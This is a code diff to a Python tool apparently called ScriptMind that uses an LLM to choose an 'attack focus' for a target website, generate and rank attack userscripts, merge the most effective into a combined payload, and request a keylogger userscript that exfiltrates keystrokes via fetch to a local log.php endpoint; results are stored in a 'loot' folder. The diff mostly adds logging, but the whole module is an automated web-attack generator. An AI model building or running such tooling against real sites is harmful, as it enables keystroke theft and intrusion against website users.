@@ -3,10 +3,23 @@ import sys
 import json
 import re
 import zipfile
+import logging
 from datetime import datetime
 from pathlib import Path
 from threading import Thread
 from playwright.sync_api import sync_playwright
+
+# Setup logger
+logger = logging.getLogger("reconAIssance")
+logger.setLevel(logging.DEBUG)
+if not logger.hasHandlers():
+    formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
+    fh = logging.FileHandler("recon_log.txt", mode="a")
+    fh.setFormatter(formatter)
+    logger.addHandler(fh)
+    ch = logging.StreamHandler()
+    ch.setFormatter(formatter)
+    logger.addHandler(ch)
 
 sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "tools")))
 from llm_wrapper import use_llm
@@ -26,10 +39,12 @@ def save_cache(cache):
         json.dump(cache, f, indent=2)
 
 def start_superscript_server(run_path):
+    logger.debug("Starting internal HTTP server for superscripts")
     os.chdir(run_path)
     Thread(target=lambda: os.system("python3 -m http.server 8080"), daemon=True).start()
 
 def select_focus_mode(target, run_path):
+    logger.info(f"Selecting focus mode for: {target}")
     prompt = f"""Choose an attack focus for the website: https://{target}.
 
 ONLY RETURN VALID JSON. Example:
@@ -37,11 +52,15 @@ ONLY RETURN VALID JSON. Example:
 """
     result = use_llm("focus_selection", prompt)
     try:
-        return json.loads(result.strip().split("\n")[-1])
+        parsed = json.loads(result.strip().split("\n")[-1])
+        logger.info(f"Focus mode selected: {parsed}")
+        return parsed
     except json.JSONDecodeError:
+        logger.warning("Failed to parse focus mode from LLM")
         return {"focus_mode": "full", "reason": "LLM parse error"}
 
 def generate_script_batch(target, focus_mode, run_path, count):
+    logger.debug(f"Generating {count} superscripts with focus: {focus_mode}")
     scripts = []
     for i in range(count):
         prompt = f"""Create a Violentmonkey-compatible userscript targeting https://{target} with attack focus '{focus_mode}'.
@@ -53,28 +72,16 @@ ONLY RETURN THE USERSCRIPT CODE. No explanations."""
         with open(full_path, "w") as f:
             f.write(content)
         scripts.append({"name": name, "path": full_path, "content": content})
+        logger.info(f"Generated userscript: {name}")
     return scripts
 
-def test_script_once(script_content, target):
-    html, console = "", ""
-    try:
-        with sync_playwright() as p:
-            browser = p.chromium.launch(headless=True)
-            context = browser.new_context(ignore_https_errors=True)
-            page = context.new_page()
-            page.add_init_script(script_content)
-            page.goto(f"https://{target}", timeout=20000)
-            page.wait_for_timeout(5000)
-            html = page.content()
-            console = page.evaluate("() => console.log?.toString?.() || 'no log'")
-            page.close()
-            browser.close()
-    except Exception as e:
-        console = str(e)
-    return html, console
-
 def evaluate_superscript(script_path, target, run_path):
-    script_content = Path(script_path).read_text()
+    logger.debug(f"Evaluating script: {script_path}")
+    try:
+        script_content = Path(script_path).read_text()
+    except Exception as e:
+        logger.warning(f"Could not read script: {e}")
+        return
 
     prompt = f"""Evaluate the effectiveness and potential vulnerabilities triggered by this userscript on https://{target}.
 
@@ -87,6 +94,7 @@ ONLY RETURN VALID JSON. Example:
     result = use_llm("script_evaluation", prompt)
     try:
         parsed = json.loads(result.strip().split("\n")[-1])
+        logger.info(f"Script classified: {parsed}")
     except json.JSONDecodeError:
         parsed = {
             "effect": "unknown",
@@ -94,24 +102,43 @@ ONLY RETURN VALID JSON. Example:
             "module": [],
             "note": f"LLM parse error: {result[:200]}"
         }
+        logger.warning("Failed to parse LLM script evaluation")
 
+    # Neu: Klassifikation in Liste eintragen
+    all_file = os.path.join(run_path, "superscript_class_all.json")
+    if os.path.exists(all_file):
+        try:
+            all_data = json.load(open(all_file))
+        except Exception:
+            all_data = []
+    else:
+        all_data = []
+
+    parsed["script"] = os.path.basename(script_path)
+    all_data.append(parsed)
+
+    with open(all_file, "w") as f:
+        json.dump(all_data, f, indent=2)
+
+    # Alte Datei bleibt als letzter Eintrag erhalten (für Kompatibilität)
     class_file = os.path.join(run_path, "superscript_class.json")
     with open(class_file, "w") as f:
         json.dump(parsed, f, indent=2)
 
-    if parsed['effect'] in ["high", "medium"]:
+    if parsed["effect"] in ["high", "medium"]:
+        logger.info("High-impact script detected → inferring CVEs")
         infer_cves_from_class(target, run_path)
 
 def run_scriptmind_loop(target, run_path):
+    logger.info(f"Running ScriptMind for target: {target}")
     cache = load_cache()
 
-    print(f"[→] ScriptMind running for {target}")
     focus_data = select_focus_mode(target, run_path)
     focus = focus_data.get("focus_mode", "full")
 
     cache_key = f"{target}_{focus}"
     if cache_key in cache:
-        print("[⚡] Using cached superscript evaluation.")
+        logger.info("Using cached ScriptMind result.")
         return
 
     all_scripts = []
@@ -127,106 +154,144 @@ def run_scriptmind_loop(target, run_path):
     start_superscript_server(run_path)
 
     try:
-        effect = json.load(open(os.path.join(run_path, "superscript_class.json"))).get("effect", "")
-        if effect in ["low", "neutral", "unknown"]:
-            print("[↻] Low effect detected, retrying with new focus...")
-            run_scriptmind_loop(target, run_path)
-    except FileNotFoundError:
-        print("[⚠️] superscript_class.json missing. Skipping recursive evaluation.")
-
-if __name__ == "__main__":
-    target = os.getenv("RECON_KI_TARGET")
-    run_path = os.getenv("RECON_KI_RUN_PATH")
-    if not target or not run_path:
-        print("[!] Missing environment variables.")
-        exit(1)
-    run_scriptmind_loop(target, run_path)
+        # Versuch über vollständige Datei
+        all_file = os.path.join(run_path, "superscript_class_all.json")
+        if os.path.exists(all_file):
+            with open(all_file) as f:
+                all_classes = json.load(f)
+            effects = [entry.get("effect") for entry in all_classes]
+            if all(e in ["low", "unknown", "neutral"] for e in effects):
+                logger.info("Low-impact classification only – retrying ScriptMind with new focus")
+                run_scriptmind_loop(target, run_path)
+    except Exception:
+        logger.warning("Could not analyze overall impact – skipping retry")
 
 def zip_all_superscripts():
     zip_name = f"superscripts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
     zip_path = os.path.join("loot", zip_name)
-    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
-        for root, _, files in os.walk("loot"):
-            for file in files:
-                if file.startswith("superscript_") and file.endswith(".user.js"):
-                    full = os.path.join(root, file)
-                    z.write(full, arcname=os.path.relpath(full, "loot"))
-    print(f"[✓] Superscripts archived: {zip_path}")
+    try:
+        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
+            for root, _, files in os.walk("loot"):
+                for file in files:
+                    if file.startswith("superscript_") and file.endswith(".user.js"):
+                        full = os.path.join(root, file)
+                        z.write(full, arcname=os.path.relpath(full, "loot"))
+        logger.info(f"Superscripts archived to: {zip_path}")
+    except Exception as e:
+        logger.exception("Failed to archive superscripts")
 
 def rate_generated_scripts(run_path):
-    rows = []
-    for f in os.listdir(run_path):
-        if f.startswith("gen_") and f.endswith(".impact.txt"):
-            try:
-                with open(os.path.join(run_path, f)) as fx:
-                    lines = fx.readlines()
-                    rows.append((f.replace(".impact.txt", ""), lines[0].strip(), lines[1].strip(), lines[2].strip()))
-            except Exception as e:
-                print(f"[!] Error reading {f}: {e}")
+    logger.info("Generating ScriptMind ranking...")
+    all_file = os.path.join(run_path, "superscript_class_all.json")
+    if not os.path.exists(all_file):
+        logger.warning("No classification data found.")
+        return
+
+    try:
+        entries = json.load(open(all_file))
+    except Exception as e:
+        logger.warning("Failed to load all classifications.")
+        return
 
     html = [
         """<html><head><meta charset='utf-8'><title>Ranking</title>
         <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css' rel='stylesheet'></head>
         <body><div class='container'><h2>ScriptMind Ranking</h2><table class='table'>
-        <thead><tr><th>Name</th><th>Effect</th><th>Class</th><th>Note</th></tr></thead><tbody>"""
+        <thead><tr><th>Script</th><th>Effect</th><th>Class</th><th>Note</th></tr></thead><tbody>"""
     ]
-    for name, effect, cls, note in sorted(rows, key=lambda x: x[1], reverse=True):
-        html.append(f"<tr><td>{name}</td><td>{effect}</td><td>{cls}</td><td>{note}</td></tr>")
+    for entry in sorted(entries, key=lambda x: x.get("effect", ""), reverse=True):
+        html.append(f"<tr><td>{entry.get('script')}</td><td>{entry.get('effect')}</td><td>{entry.get('class')}</td><td>{entry.get('note')}</td></tr>")
     html.append("</tbody></table></div></body></html>")
 
     ranking_path = os.path.join(run_path, "scriptmind_ranking.html")
-    with open(ranking_path, "w") as f:
-        f.write("".join(html))
-    print(f"[✓] ScriptMind Ranking created: {ranking_path}")
+    try:
+        with open(ranking_path, "w") as f:
+            f.write("".join(html))
+        logger.info(f"ScriptMind Ranking created: {ranking_path}")
+    except Exception as e:
+        logger.exception("Failed to write ScriptMind ranking")
 
 def combine_superscripts():
+    logger.info("Combining high-impact superscripts...")
     paths = []
     for js in Path("loot").glob("**/superscript_*.user.js"):
-        class_file = js.parent / "superscript_class.json"
+        class_file = js.parent / "superscript_class_all.json"
         if not class_file.exists():
             continue
         try:
-            data = json.load(open(class_file))
-            if data.get("effect") in ["high", "medium"]:
+            all_data = json.load(open(class_file))
+            if any(d.get("script") == js.name and d.get("effect") in ["high", "medium"] for d in all_data):
                 paths.append(js)
-        except:
-            continue
+        except Exception as e:
+            logger.warning(f"Failed to parse class for {js.name}: {e}")
 
     if not paths:
-        print("[!] No high-impact superscripts found for combination.")
+        logger.warning("No high-impact superscripts found for combination.")
         return
 
     snippets = [Path(p).read_text()[:600] for p in paths[:5]]
     prompt = "Combine the following Superscripts into one robust version:\n\n" + "\n\n".join(snippets)
 
-    response = use_llm("superscript_fusion", prompt)
-    name = f"superscript_combo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.user.js"
-    combo_path = os.path.join("loot", name)
-
-    with open(combo_path, "w") as f:
-        f.write(response)
-
-    print(f"[✓] Combined Superscript created: {combo_path}")
+    try:
+        response = use_llm("superscript_fusion", prompt)
+        name = f"superscript_combo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.user.js"
+        combo_path = os.path.join("loot", name)
+        with open(combo_path, "w") as f:
+            f.write(response)
+        logger.info(f"Combined superscript saved to: {combo_path}")
+    except Exception as e:
+        logger.exception("Failed to combine superscripts")
 
 def webexfil_trigger(run_path, target):
-    class_file = os.path.join(run_path, "superscript_class.json")
-    if not os.path.exists(class_file):
+    logger.info("Checking for WebExfil trigger conditions...")
+    all_file = os.path.join(run_path, "superscript_class_all.json")
+    if not os.path.exists(all_file):
+        logger.debug("No classification data found – skipping WebExfil.")
         return
     try:
-        data = json.load(open(class_file))
-        if data.get("class") != "tracking":
+        all_data = json.load(open(all_file))
+        for entry in all_data:
+            if entry.get("class") == "tracking":
+                break
+        else:
+            logger.debug("No tracking-classified scripts – skipping WebExfil.")
             return
-    except:
+    except Exception as e:
+        logger.warning(f"Failed to read classification file: {e}")
         return
 
     prompt = """Generate a userscript that logs keystrokes and exfiltrates data via fetch to http://localhost:8080/log.php.
 
 ONLY RETURN USERSCRIPT CODE."""
 
-    code = use_llm("webexfil_script", prompt)
-    name = f"webexfil_{datetime.now().strftime('%H%M%S')}.user.js"
-    path = os.path.join(run_path, name)
+    try:
+        code = use_llm("webexfil_script", prompt)
+        name = f"webexfil_{datetime.now().strftime('%H%M%S')}.user.js"
+        path = os.path.join(run_path, name)
+        with open(path, "w") as f:
+            f.write(code)
+        logger.info(f"WebExfil script saved: {name}")
+    except Exception as e:
+        logger.exception("WebExfil script generation failed")
 
-    with open(path, "w") as f:
-        f.write(code)
-    print(f"[+] WebExfil script saved: {name}")
+if __name__ == "__main__":
+    target = os.getenv("RECON_KI_TARGET")
+    run_path = os.getenv("RECON_KI_RUN_PATH")
+    if not target or not run_path:
+        logger.error("Missing RECON_KI_TARGET or RECON_KI_RUN_PATH")
+        exit(1)
+
+    run_scriptmind_loop(target, run_path)
+
+    if os.getenv("RECON_SM_RANK"):
+        rate_generated_scripts(run_path)
+
+    if os.getenv("RECON_SM_COMBINE"):
+        combine_superscripts()
+
+    if os.getenv("RECON_SM_WEBEXFIL"):
+        webexfil_trigger(run_path, target)
+
+    if os.getenv("RECON_SM_ZIP"):
+        zip_all_superscripts()
+
